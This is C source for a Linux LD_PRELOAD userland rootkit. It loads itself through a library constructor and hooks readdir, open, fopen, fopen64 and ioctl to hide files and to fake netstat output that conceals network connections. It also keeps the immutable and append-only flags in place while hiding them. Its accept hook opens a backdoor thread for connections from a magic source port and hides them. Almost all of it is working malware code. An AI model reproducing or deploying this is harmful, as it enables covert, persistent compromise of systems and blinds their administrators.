#include "smirk.h"
#include "utils.h"

void __attribute ((constructor))
init(void)
{
    #ifdef DEBUG
    printf("[-] constructor\n");
    #endif
    #ifdef KILLSWITCH
    struct stat buffer;
    if (stat(KILLSWITCH, &buffer) == 0){
        #ifdef DEBUG
        printf("[!] killswitch found!\n");
        #endif
        uninstall();
    } else{
        install();
    }
    #else
    install();
    #endif
}

__attribute__((destructor))
void end (void) {
    #ifdef DEBUG
    printf("\n[-] destructor\n");
    #endif
}

void *load_libc(char *funcname){
    if (!libc) {
        libc=dlopen(LIBC, RTLD_LAZY);
    }
    return dlsym(libc, funcname);
}

struct dirent *readdir(DIR *dirp)
{
    #ifdef DEBUG
    printf("[-] hooking readdir\n");
    #endif

    if(!hooked_readdir){
        hooked_readdir = load_libc("readdir");
    }

    struct dirent *dir;
    dir = hooked_readdir(dirp);
    
    if(dir == NULL){
        return NULL;
    }

    char filename[PATH_MAX];
    int i;
    for (i = 0; dir->d_name[i] != '\0'; i++){
        filename[i] = dir->d_name[i];
    }
    filename[i] = '\0';
    
    if(is_magicfile(filename)){
        #ifdef DEBUG
        printf("[+] Hiding %s\n",filename);
        #endif
        for (int x = 0; x <= i; x++){
            dir->d_name[x] = '\0';
        }
        return readdir(dirp);
    }

    return dir;
}

int open(const char *pathname, int flags, mode_t mode){
    #ifdef DEBUG
    printf("[-] hooking open\n");
    #endif

    if(!hooked_open){
        hooked_open = load_libc("open");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return -1;
        }
        return hooked_open(newfile, flags, mode);
    }
    #ifdef KILLSWITCH
    else if (strcmp(real_pathname, KILLSWITCH) == 0){
        return hooked_open(real_pathname, flags, mode);
    }
    #endif
    else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return -1;
    }

    return hooked_open(pathname, flags, mode);
}

FILE *fopen(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen\n");
    #endif

    if(!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen(newfile, mode);
    } else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }

    return hooked_fopen(real_pathname, mode);
}


FILE *fopen64(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen64\n");
    #endif

    if(!hooked_fopen64){
        hooked_fopen64 = load_libc("fopen64");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen64(newfile, mode);
    } else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }
 
    return hooked_fopen64(real_pathname, mode);
}

int is_flag_set(int fd, unsigned long flags){
    unsigned long argp;

    if(!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    int rc = hooked_ioctl(fd, FS_IOC_GETFLAGS, &argp);
    if (rc != -1){
        argp = argp & flags;
        if (argp){
            return argp == flags;
        }
        return 0;
    }
    return 0;
}

int ioctl(int fd, unsigned long request, unsigned long *argp){
    #ifdef DEBUG
    printf("[-] hooking ioctl\n");
    #endif

    if(!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
    if (is_flag_set(fd, flags)){
        if (request == FS_IOC_SETFLAGS){
            *argp = *argp | flags;
            return hooked_ioctl(fd, request, argp);
        } else if (request == FS_IOC_GETFLAGS){
            int rc = hooked_ioctl(fd, request, argp);
            *argp = *argp &~ flags;
            return rc;
        }
    }

    return hooked_ioctl(fd, request, argp);
}

int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
    #ifdef DEBUG
    printf("[-] hooking accept\n");
    #endif

    if (!hooked_accept){
        hooked_accept = load_libc("accept");
    }
    int fd = hooked_accept(socket, address, address_len);
    if (fd == -1){
        return fd;
    }
    int port = (int) ntohs(address->sin_port);
    if (port == MAGIC_PORT){
        #ifdef DEBUG
        printf("[+] port hooked: %d, %d\n", port, fd);
        #endif
        pthread_t thread;
        int *pfd = malloc(sizeof(*pfd));
        *pfd = fd;
        pthread_create(&thread, NULL, backdoor, pfd);
        return accept(socket, address, address_len);
    }
    return fd;
}
